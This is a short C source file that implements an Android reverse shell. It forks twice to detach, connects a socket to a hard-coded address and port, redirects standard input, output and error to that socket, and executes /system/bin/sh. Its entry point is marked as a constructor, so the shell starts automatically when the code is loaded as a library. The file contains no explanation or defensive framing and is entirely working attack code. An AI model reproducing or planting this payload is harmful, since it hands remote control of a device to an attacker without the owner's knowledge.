#include <stdio.h>
#include <stdint.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <unistd.h>


void reverse_shell(char *ip, int port){

    /* fork twice here */

	int pid = fork();

	if (pid != 0)
		return;
	
	pid = fork();
	if (pid != 0)
		return;

    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(ip);
    sa.sin_port = htons(port);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));

    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/system/bin/sh", 0, 0);	

}


int __attribute__((constructor)) main(void)
{

	reverse_shell("127.0.0.1", 5555);
}